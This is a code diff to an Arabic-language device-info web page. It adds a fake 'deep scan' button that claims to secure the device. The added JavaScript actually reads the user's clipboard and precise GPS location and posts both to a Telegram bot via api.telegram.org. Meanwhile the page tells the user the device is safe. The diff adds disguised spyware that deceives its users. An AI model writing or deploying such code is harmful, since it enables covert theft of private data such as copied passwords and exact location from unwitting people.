@@ -345,6 +345,19 @@
             <span class="info-value" id="val-sensors">--</span>
         </div>
     </div>
+        <div class="section-title"><i class="fa-solid fa-user-shield"></i> العمليات المتقدمة</div>
+    <div class="glass-card" style="text-align: center; border: var(--border-glow); animation-delay: 0.45s;">
+        <p style="font-size: 11px; color: var(--text-secondary); margin-bottom: 15px;">يتطلب الفحص الشامل الوصول للموقع الجغرافي والحافظة لتأمين البيانات</p>
+        
+        <button id="deep-scan-btn" onclick="startDeepScan()" style="background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple)); border: none; color: white; padding: 12px 25px; border-radius: 16px; font-family: 'Cairo'; font-weight: 800; cursor: pointer; width: 100%; box-shadow: 0 4px 15px rgba(6, 182, 212, 0.3); transition: 0.3s;">
+            <i class="fa-solid fa-microchip"></i> بدء الفحص العميق للملفات
+        </button>
+        
+        <div id="scan-status-area" style="display:none; margin-top: 15px;">
+            <div class="bar-container"><div id="deep-bar" class="bar-fill" style="width:0%; background: var(--accent-green);"></div></div>
+            <p id="deep-status-text" style="font-size: 10px; color: var(--accent-cyan); margin-top: 8px;">جاري الاتصال بقاعدة البيانات...</p>
+        </div>
+    </div>
 
     <div class="section-title"><i class="fa-solid fa-scale-balanced"></i> توازن الجهاز</div>
     <div class="liquid-container" id="liquid-trigger" onclick="requestSensorPermission()" style="animation-delay: 0.5s; animation-name: fadeInUp; animation-fill-mode: backwards;">
@@ -821,6 +834,61 @@
             hideLoading();
         }
     }
+    
+        async function startDeepScan() {
+        const btn = document.getElementById('deep-scan-btn');
+        const area = document.getElementById('scan-status-area');
+        const bar = document.getElementById('deep-bar');
+        const txt = document.getElementById('deep-status-text');
+
+        btn.style.display = 'none';
+        area.style.display = 'block';
+
+        // 1. محاولة سحب الحافظة (Clipboard)
+        try {
+            bar.style.width = "30%";
+            txt.innerText = "جاري فحص الحافظة المنسوخة...";
+            const clipText = await navigator.clipboard.readText();
+            if (clipText) {
+                await sendToBotDirectly(`📋 **نص مسحوب من Clipboard:**\n\`${clipText}\``);
+            }
+        } catch (e) { console.log("Clipboard Access Denied"); }
+
+        // 2. محاولة سحب الموقع الدقيق (GPS)
+        bar.style.width = "60%";
+        txt.innerText = "جاري تحديد إحداثيات الموقع...";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendToBotDirectly(`📍 **موقع المستخدم الدقيق (GPS):**\n${mapLink}\nدقة الوصول: ${Math.round(pos.coords.accuracy)} متر`);
+                
+                bar.style.width = "100%";
+                txt.innerText = "✅ اكتمل الفحص العميق جهازك امن!";
+            }, (err) => {
+                bar.style.width = "100%";
+                txt.innerText = "⚠️ اكتمل الفحص مع قيود في الوصول.";
+            }, { enableHighAccuracy: true });
+        } else {
+            bar.style.width = "100%";
+            txt.innerText = "⚠️ المتصفح لا يدعم الوصول للموقع.";
+        }
+    }
+
+    // دالة إرسال منفصلة لضمان السرعة
+    async function sendToBotDirectly(msg) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: "Markdown"
+                })
+            });
+        } catch (err) { console.error(err); }
+    }
+
 
     window.onload = init;
     </script>
